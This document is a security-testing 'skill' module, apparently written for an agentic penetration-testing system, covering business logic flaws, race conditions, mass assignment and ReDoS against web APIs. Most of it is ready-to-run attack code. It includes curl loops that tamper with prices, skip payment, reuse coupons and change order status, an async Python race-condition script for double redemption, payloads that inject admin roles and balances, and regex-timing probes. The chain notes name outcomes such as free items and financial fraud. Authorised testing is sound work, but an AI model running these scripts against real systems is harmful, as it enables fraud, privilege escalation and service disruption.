# SKILL-LOGIC - Business Logic & State Manipulation Vulnerabilities
# Phase Coverage: 26-28, 35
# Vuln Classes: Business Logic Flaws, Race Conditions, Mass Assignment, ReDoS
# Purpose: Logic flaw discovery, state machine abuse, timing-based attacks

---

## Logic Flaw Recognition Triggers

Always check these for every surface:
  - Multi-step workflows (registration, checkout, password reset, verification)
  - Numeric values that affect value (price, quantity, discount, credit, points)
  - One-time actions (coupon use, email verification, 2FA confirm, vote)
  - Role or permission state that can be changed (upgrade, admin flag, trust level)
  - Time-based constraints (cooldowns, expiry, scheduling windows)
  - Cross-account operations (share, transfer, reference, view)
  - Business rules enforced only client-side (found via JS analysis)
  - Batch operations that bypass individual limits
  - State that can be set without completing prerequisite steps

CIA MANDATE:
  C: accessing another user's data
  I: modifying state without authorization (price, role, balance, count)
  A: disrupting service (note only - never actively exploit for DoS)

---

## Phase 26: Business Logic Flaws - CIA: I:H

### SUB-PHASE 26.2: HUNT

**Price manipulation:**
```bash
for val in -1 -0.01 0 0.001 -9999 2147483647; do
  curl -sk -X PUT "$TARGET/api/BasketItems/1" \
       -H "Authorization: Bearer $USER1_TOKEN" \
       -H "Content-Type: application/json" \
       -d "{\"quantity\":$val}" | jq '{total,quantity}'
done
```

**Workflow bypass (skip payment step):**
```bash
curl -sk -X POST "$TARGET/api/Orders" \
     -H "Authorization: Bearer $USER1_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"items":[{"id":1,"quantity":1}]}' | jq .
curl -sk -X POST "$TARGET/api/checkout/confirm" \
     -H "Authorization: Bearer $USER1_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{}' | jq .
```

**Coupon reuse:**
```bash
for i in 1 2 3; do
  curl -sk -X POST "$TARGET/api/coupon/redeem" \
       -H "Authorization: Bearer $USER1_TOKEN" \
       -H "Content-Type: application/json" \
       -d '{"code":"SAVE50"}' -w " HTTP:%{http_code}"
done
```

### Logic Flaw Type 1: Workflow / Step Bypass
```bash
STEPS=(
  "$TARGET/api/checkout/confirm"
  "$TARGET/api/account/activate"
  "$TARGET/api/user/upgrade"
  "$TARGET/api/payment/complete"
  "$TARGET/api/verification/bypass"
)
for endpoint in "${STEPS[@]}"; do
  S=$(curl -sk -w "%{http_code}" -o /tmp/wf_test.txt \
       "$endpoint" -H "Authorization: Bearer $USER1_TOKEN" \
       -H "Content-Type: application/json" -d '{}')
  [[ "$S" != "4"* ]] && echo "[WORKFLOW BYPASS? - CIA:I:H] $endpoint -> HTTP $S" \
    && cat /tmp/wf_test.txt | head -5
done
```

### Logic Flaw Type 2: Numeric Boundary Abuse
```bash
for price in "-0.01" "0.001" "-1e-100" "1.000000000001"; do
  curl -sk -X POST "$TARGET/api/Orders" \
       -H "Authorization: Bearer $USER1_TOKEN" \
       -H "Content-Type: application/json" \
       -d "{\"items\":[{\"id\":1,\"quantity\":1,\"price\":$price}]}" | head -3
done
```

### Logic Flaw Type 3: State Machine Attacks
```bash
for status in "delivered" "completed" "refunded" "approved" "admin" "paid" "cancelled"; do
  curl -sk -X PATCH "$TARGET/api/Orders/1" \
       -H "Authorization: Bearer $USER1_TOKEN" \
       -H "Content-Type: application/json" \
       -d "{\"status\":\"$status\"}" | jq .status | grep -v "null"
done
```

### Logic Flaw Type 4: Business Rule Violations via API Bypass
```bash
# Frontend enforces max 10 items - test if API enforces
curl -sk -X POST "$TARGET/api/Orders" \
     -H "Authorization: Bearer $USER1_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"items":[{"id":1,"quantity":9999}]}' | head -5

# Frontend blocks negative discount - test if server validates
curl -sk -X POST "$TARGET/api/Orders" \
     -H "Authorization: Bearer $USER1_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"discount_percent":-50}' | head -5

# Bypass payment by manipulating total
curl -sk -X POST "$TARGET/api/checkout" \
     -H "Authorization: Bearer $USER1_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"total":0.01,"items":[{"id":1,"quantity":1,"original_price":999}]}' | head -5
```

### CHAIN OUTPUT:
  -> Business logic (negative price) + checkout bypass = free items (high)
  -> Coupon reuse (medium) + race-condition = infinite discount (critical)
  -> Business logic bypass + mass-assignment (set total=0) = critical financial fraud

---

## Phase 27: Race Conditions (TOCTOU) - CIA: I:H

### SUB-PHASE 27.2: HUNT

Async race script template:
```python
#!/usr/bin/env python3
import asyncio, httpx, sys, json

TARGET   = sys.argv[1]
TOKEN    = sys.argv[2]
ENDPOINT = sys.argv[3]
PAYLOAD  = json.loads(sys.argv[4]) if len(sys.argv) > 4 else {}
N        = int(sys.argv[5]) if len(sys.argv) > 5 else 25

results = []

async def send(client, tid):
    try:
        r = await client.post(
            f"{TARGET}{ENDPOINT}",
            headers={"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"},
            json=PAYLOAD, timeout=15
        )
        results.append((tid, r.status_code, r.text[:150]))
    except Exception as e:
        results.append((tid, "ERR", str(e)[:60]))

async def main():
    async with httpx.AsyncClient(http2=True) as client:
        tasks = [send(client, i) for i in range(N)]
        await asyncio.gather(*tasks)
    success = [r for r in results if str(r[1]).startswith("2")]
    codes   = sorted(set(str(r[1]) for r in results))
    print(f"Results: {len(success)}/{N} success | Codes: {', '.join(codes)}")
    if len(success) > 1:
        print(f"[RACE CONDITION - CIA:I:H] {len(success)} parallel successes")
        for r in success[:5]: print(f"  Thread {r[0]}: {r[2]}")

asyncio.run(main())
```

Usage:
```bash
python3 race_condition.py "$TARGET" "$USER1_TOKEN" "/api/coupon/redeem" '{"code":"SAVE50"}' 25
```

### CHAIN OUTPUT:
  -> Race condition (medium) + coupon = unlimited discount (high)
  -> Race condition + withdrawal = double-spend (critical financial)
  -> Race condition + 2FA = bypass 2FA timing window (critical)

---

## Phase 28: Mass Assignment - CIA: I:H

### SUB-PHASE 28.2: HUNT

**Registration endpoint - inject privileged fields:**
```bash
for payload in \
  '{"email":"a@t.com","password":"Pass1!","role":"admin","isAdmin":true}' \
  '{"email":"b@t.com","password":"Pass1!","privilege":99,"verified":true}' \
  '{"email":"c@t.com","password":"Pass1!","credits":999999,"balance":99999}'; do
  RESP=$(curl -sk -X POST "$TARGET/api/register" \
         -H "Content-Type: application/json" -d "$payload" | jq '{role,isAdmin,privilege,credits}')
  echo "$RESP" | grep -v "null" && echo "[MASS ASSIGNMENT - CIA:I:H] $payload"
done
```

**Profile update endpoint - inject extra fields:**
```bash
curl -sk -X PUT "$TARGET/api/account/profile" \
     -H "Authorization: Bearer $USER1_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"username":"normal","role":"admin","isAdmin":true,"subscription":"premium","balance":99999}' \
     | jq .
```

### CHAIN OUTPUT:
  -> Mass assignment -> role:admin (high) + IDOR = full admin control (critical)
  -> Mass assignment -> balance:99999 = financial fraud (critical)
  -> Mass assignment -> verified:true = bypass email verification (high)

---

## Phase 35: ReDoS - Regular Expression DoS - CIA: A:M

### SUB-PHASE 35.2: HUNT

**Vulnerable patterns: (a+)+ | ([a-zA-Z]+)* | (a|aa)+ | (.*a){n}**
```bash
python3 - << 'EOF'
import re, time
tests = [
    (r'^(a+)+$',       'a'*50+'X'),
    (r'^([a-z]+)*$',   'a'*40+'!'),
    (r'(a|aa)+$',      'a'*35+'X'),
]
for pattern, test in tests:
    start = time.time()
    try: re.match(pattern, test)
    except: pass
    elapsed = time.time()-start
    print(f"{'VULNERABLE' if elapsed>2 else 'OK'}: {pattern[:40]} | {elapsed:.2f}s")
EOF

T=$(curl -sk -o /dev/null -w "%{time_total}" -X POST "$TARGET/api/validate" \
     -H "Content-Type: application/json" \
     -d '{"email":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX@a.com"}')
python3 -c "t=float('$T'); exit(0 if t<4 else 1)" \
  || echo "[REDOS - CIA:A:M] Endpoint hangs on crafted input - ${T}s"
```

### CHAIN OUTPUT:
  -> ReDoS (low by itself) + business logic endpoint = DoS on payment processing (high)
  -> NOTE: Report potential only - never repeatedly trigger in production

---

*SKILL-LOGIC - Business Logic & State Manipulation Module*
*Part of the acy Agentic Security Research System*
